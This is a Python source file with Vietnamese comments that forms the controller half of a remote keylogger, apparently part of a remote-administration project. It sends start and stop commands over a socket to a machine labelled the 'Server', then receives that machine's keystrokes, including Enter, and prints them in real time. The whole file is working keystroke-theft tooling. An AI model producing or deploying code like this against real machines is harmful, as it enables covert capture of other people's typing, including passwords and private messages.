from pynput import keyboard
from module_support import send_command, receive_response_utf8


# Biến trạng thái keylogger
keylogger_running = False
keys_pressed = ""
MAX_LINE_LENGTH = 50

def bat_tat_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        send_command(client_socket, "START_KEYLOGGER")
        print("Bat dau bat phim nhan tu may Server...")
        keylogger_running = True
        
        #Tu dong chay lai khi Client nhan esc
        key_logger(client_socket)    
        send_command(client_socket, "STOP_KEYLOGGER")               
        keylogger_running = False

def key_logger(client_socket):
    print("Bat dau bat phim nhan (Keylogger) tu may Server... (Nhan 'Esc' de stop Keylogger)")
    keys_pressed = ""
    
    def on_press(key):
        # Dừng keylogger khi nhấn 'Esc'
        if key == keyboard.Key.esc:
            print("Dang dung Keylogger...")
            send_command(client_socket, "STOP_KEYLOGGER")            
            return False  # Dừng listener
        
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                # Nhận dữ liệu từ server                
                decoded_data = receive_response_utf8(client_socket)                

                # Kiểm tra nếu nhận ký tự Enter từ server
                if decoded_data == ' Key.enter ':
                    print(f'\rPhim nhan: {keys_pressed}')  # In ra các phím đã nhấn
                    keys_pressed = ""  # Reset sau khi nhấn Enter
                    print("Phim nhan: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
                    
                elif decoded_data == "KEYLOGGER_STOPPED":
                    print("\nDa dung Keylogger.")
                    break  # Thoát khỏi vòng lặp để quay về menu chính
                
                else:
                    keys_pressed += decoded_data  # Thêm ký tự vào chuỗi
                    
                    # Nếu dòng quá dài, xuống dòng mà không lặp lại ký tự
                    if len(keys_pressed) > MAX_LINE_LENGTH:
                        print(f'\rPhim nhan: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                        keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
                    print(f'\rPhim nhan: {keys_pressed}', end='')  # In ra trên cùng một dòng

        except Exception as e:
            print(f"Loi: nhan du lieu tu Server: {e}")



